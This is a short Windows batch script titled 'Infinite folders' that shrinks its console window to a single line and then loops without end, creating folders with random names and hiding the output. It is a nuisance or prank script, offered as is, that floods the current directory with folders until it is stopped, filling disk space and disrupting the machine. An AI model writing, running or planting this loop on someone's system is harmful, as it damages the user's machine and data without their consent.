@echo off
title Infinite folders
color 0c
mode con cols=20 lines=1
cls
goto :Infinite_folders
:Infinite_folders
mkdir %random% > nul
goto :Infinite_folders
cls
goto :exit
:exit
exit
